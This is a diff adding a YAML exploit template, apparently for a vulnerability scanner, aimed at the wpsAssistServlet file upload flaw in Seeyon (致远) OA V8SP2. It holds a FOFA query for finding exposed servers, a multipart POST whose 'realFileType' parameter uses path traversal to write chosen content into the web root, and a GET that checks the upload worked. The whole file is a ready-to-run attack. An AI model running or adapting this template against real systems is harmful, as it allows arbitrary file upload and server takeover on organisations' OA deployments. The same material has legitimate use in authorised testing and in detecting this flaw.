@@ -1,0 +1,43 @@
+info:
+  vulId: seeyon_fileupload_wps
+  detail: 致远OA V8SP2 wpsAssistServlet文件上传漏洞
+  fofaQuery: app="致远互联-OA" && title="V8.0SP2"
+  expType: upload
+variable:
+  - "{{rootUrl}}/{{fileName}}"
+rules:
+  - request:
+      path: "{{rootUrl}}/seeyon/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/{{fileName}}&fileId=1"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Content-type: multipart/form-data; boundary=7e7c522afffbf709a066ccb2ae435fbb
+      redirect: false
+      dataType: text
+      data: "--7e7c522afffbf709a066ccb2ae435fbb\r\nContent-Disposition: form-data; name=\"uploadfile\"; filename=\"{{random(6)}}.txt\"\r\n\r\n{{fileContent}}\r\n--7e7c522afffbf709a066ccb2ae435fbb--"
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - "\"success\":true"
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+  - request:
+      path: "{{rootUrl}}/{{fileName}}"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
